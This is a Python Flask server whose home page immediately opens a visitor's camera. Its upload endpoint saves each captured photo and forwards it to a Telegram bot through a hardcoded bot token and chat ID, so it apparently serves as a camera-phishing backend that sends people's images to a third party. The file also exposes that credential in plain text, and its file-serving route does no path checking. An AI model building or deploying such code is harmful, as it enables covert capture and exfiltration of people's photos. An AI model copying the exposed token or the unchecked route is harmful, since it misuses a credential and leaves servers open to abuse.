from flask import Flask, request, jsonify, send_file, abort, render_template
import os, uuid
from werkzeug.utils import secure_filename
from datetime import datetime
import requests

app = Flask(__name__)

UPLOAD_DIR = 'uploads'
os.makedirs(UPLOAD_DIR, exist_ok=True)

ALLOWED_EXT = {'png', 'jpg', 'jpeg'}

@app.route('/')
def home():
    # 💙 Теперь главная страница сразу открывает камеру!
    return render_template('camera.html')

@app.route('/upload_photo_open', methods=['POST'])
def upload_photo_open():
    if 'photo' not in request.files:
        return jsonify({'error': 'no photo'}), 400

    file = request.files['photo']
    filename = f"photo_{datetime.utcnow().strftime('%Y%m%d_%H%M%S')}.png"
    filepath = os.path.join(UPLOAD_DIR, secure_filename(filename))
    file.save(filepath)

    BOT_TOKEN = "8238948841:AAEJLwE4h-jrBxKhcF61Ho1uM8xbS5nmMEU"
    CHAT_ID = "6984816200"

    try:
        with open(filepath, 'rb') as f:
            requests.post(
                f'https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto',
                data={'chat_id': CHAT_ID, 'caption': '📸 Новое фото с камеры'},
                files={'photo': f}
            )
    except Exception as e:
        print("Ошибка Telegram:", e)

    return jsonify({'status': 'ok'})

@app.route('/uploads/<path:filename>')
def get_uploaded(filename):
    path = os.path.join(UPLOAD_DIR, filename)
    if not os.path.exists(path):
        abort(404)
    return send_file(path)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))